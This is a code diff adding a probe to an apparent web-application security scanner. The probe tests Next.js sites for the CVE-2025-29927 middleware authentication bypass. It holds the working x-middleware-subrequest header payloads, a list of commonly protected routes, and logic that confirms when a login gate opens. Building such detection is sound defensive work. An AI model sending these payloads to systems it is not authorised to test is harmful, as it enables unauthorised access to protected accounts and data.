@@ -8,6 +8,7 @@ means the probe fires and adds its penalty.
 """
 from __future__ import annotations
 
+import contextlib
 import gzip
 import json
 import re
@@ -2558,6 +2559,103 @@ def _is_login_form(action_low: str, fields_low: str) -> bool:
     return has_pw and has_user and not changes
 
 
+# ---- sec-authbypass-001: Next.js middleware auth-gate bypass (CVE-2025-29927) ------------------------------
+_MW_HDR = "x-middleware-subrequest"
+# version-spread payloads: Next 14/15 count colon-separated depth (5x exceeds MAX_RECURSION_DEPTH); 12.2+ take
+# a bare 'middleware'/'src/middleware'; 11-12.2 the older 'pages/_middleware'. A PATCHED Next (>=14.2.25 /
+# 15.2.3) ignores every one, so the gate never flips -> clean. The flip IS the proof; no version guess needed.
+_MW_PAYLOADS = (
+    "middleware",
+    "src/middleware",
+    "middleware:middleware:middleware:middleware:middleware",
+    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
+    "pages/_middleware",
+)
+# routes a Next app commonly gates behind middleware auth (tested IN ADDITION to whatever discovery found)
+_MW_ROUTE_HINTS = ("/dashboard", "/admin", "/account", "/settings", "/profile", "/app/dashboard",
+                   "/api/me", "/api/user", "/api/hello", "/api/admin", "/api/private")
+_MW_MAX_GATED = 4                  # stop after testing this many genuinely-gated routes (bound the work)
+_MW_LOGIN_BODY = re.compile(r'type=["\']?password|name=["\']?password|sign[\s-]?in|log[\s-]?in\b', re.I)
+
+
+def _nextjs_signal(ctx) -> bool:
+    """A Next.js fingerprint — x-middleware-subrequest is Next-specific, so gate the probe to Next apps
+    (elsewhere it is an ignored header and a fire would be meaningless)."""
+    with contextlib.suppress(Exception):
+        r = ctx.client.get("/")
+        if "next" in r.headers.get("x-powered-by", "").lower():
+            return True
+        if "/_next/" in (r.text[:200000] or ""):
+            return True
+    return any("/_next/" in (rt or "") for rt in getattr(ctx.profile, "routes", None) or [])
+
+
+def _is_auth_gate(resp) -> bool:
+    """True when `resp` BLOCKS an anonymous request to a protected route — 401/403, a redirect to a login
+    page, or a body that IS a login page / an 'unauthorized' answer. Requests are made follow_redirects=False
+    so the raw gate (a 3xx) stays visible instead of the 200 login page it would land on."""
+    if resp is None:
+        return False
+    sc = resp.status_code
+    if sc in (401, 403):
+        return True
+    if sc in (301, 302, 303, 307, 308):
+        return any(h in resp.headers.get("location", "").lower() for h in _CSRF_REJECT_HINTS)
+    if sc == 200:
+        with contextlib.suppress(Exception):
+            body = resp.text[:8000]
+            return bool(_MW_LOGIN_BODY.search(body) or _AUTH_REJECT.search(body))
+    return False
+
+
+def middleware_auth_bypass(ctx, probe) -> bool | None:
+    """CVE-2025-29927: Next.js middleware enforces the route's auth gate, but the `x-middleware-subrequest`
+    header makes Next believe the request already ran middleware, so it SKIPS it. Find a route the app GATES
+    for an anonymous user (baseline -> 401/403 or redirect-to-login), then re-request it WITH the bypass
+    header: if the gate OPENS (a 200 that is NOT itself the login/unauthorized page — the handler ran), the
+    middleware auth is bypassable. Provable differential (hard-block -> success); a patched Next ignores the
+    header so the gate never flips -> clean, and it is version-independent (the flip is the proof, not a
+    version guess). N/A on non-Next apps and on apps with no gated route to bypass."""
+    if not _nextjs_signal(ctx):
+        ctx.evidence["na_reason"] = "not a Next.js app — the x-middleware-subrequest header is Next-specific"
+        return None
+    cand = [r.split("?")[0].rstrip("/") or "/" for r in (getattr(ctx.profile, "routes", None) or [])
+            if r not in ("", "/")]
+    cand = [c for c in cand if not c.startswith(("/_next/", "/static/", "/assets/"))
+            and not c.lower().endswith((".js", ".mjs", ".css", ".png", ".jpg", ".jpeg", ".svg", ".ico",
+                                        ".map", ".woff", ".woff2", ".json", ".txt"))]
+    cand = list(dict.fromkeys(cand + list(_MW_ROUTE_HINTS)))
+    gated = 0
+    # anonymous client (drop any ctx.headers session -> a real unauth baseline) + no redirect-follow, so a
+    # 3xx gate stays a visible 3xx instead of resolving to the 200 login page.
+    with make_client(ctx.base_url, None, timeout=12.0, follow_redirects=False) as anon:
+        for path in cand:
+            if gated >= _MW_MAX_GATED:
+                break
+            try:
+                base = anon.get(path)
+            except (httpx.HTTPError, httpx.InvalidURL):
+                continue
+            if not _is_auth_gate(base):
+                continue                       # not a protected route (or unreachable) -> nothing to bypass here
+            gated += 1
+            for val in _MW_PAYLOADS:
+                try:
+                    byp = anon.get(path, headers={_MW_HDR: val})
+                except (httpx.HTTPError, httpx.InvalidURL):
+                    continue
+                # BYPASS: the gate is gone -> a 200 that is NOT a login/unauthorized page (the handler ran)
+                if byp.status_code == 200 and not _is_auth_gate(byp):
+                    ctx.evidence.update(bypassed=True, route=path, header=_MW_HDR, payload=val,
+                                        baseline_status=base.status_code)
+                    return True
+    ctx.evidence.update(bypassed=False, gated_routes_tested=gated)
+    if gated == 0:
+        ctx.evidence["na_reason"] = "no auth-gated route found (nothing for the bypass header to open)"
+        return None
+    return False
+
+
 def _csrf_candidates(profile):
     """State-changing forms that carry NO anti-CSRF token: a POST, or a form whose action/fields name a
     state change (email/delete/settings/...). Login/search/logout/register are excluded — and so is a
@@ -4037,6 +4135,7 @@ PREDICATES = {
     "weak_session_id": weak_session_id,
     "api_bola": api_bola,
     "api_bola_collection": api_bola_collection,
+    "middleware_auth_bypass": middleware_auth_bypass,
     "data_integrity_roundtrip": data_integrity_roundtrip,
     "data_integrity_list_roundtrip": data_integrity_list_roundtrip,
     "race_resource_ids_api": race_resource_ids_api,
@@ -4115,6 +4214,7 @@ _PREDICATE_REASONS = {
     "file_upload": "an uploaded webshell was accepted and executed server-side (insecure file upload -> RCE)",
     "upload_stored_xss": "an uploaded HTML/SVG file is served inline with an executable content-type (stored XSS via file upload)",
     "stored_xss_api": "a value stored via the JSON API executed unescaped when the page rendered it (stored XSS)",
+    "middleware_auth_bypass": "a protected route is reachable with no credentials via the Next.js x-middleware-subrequest header (auth bypass, CVE-2025-29927)",
     "back_nav_broken": "the browser back button did not return to the prior in-app view (broken SPA history handling)",
     "dead_bundle_chunk": "the served HTML references a JS bundle that doesn't resolve — the app can't render (stale/dead chunk)",
     "deep_link_shell": "a client-side route loaded directly renders only the app shell/fallback, not its content (broken deep link)",
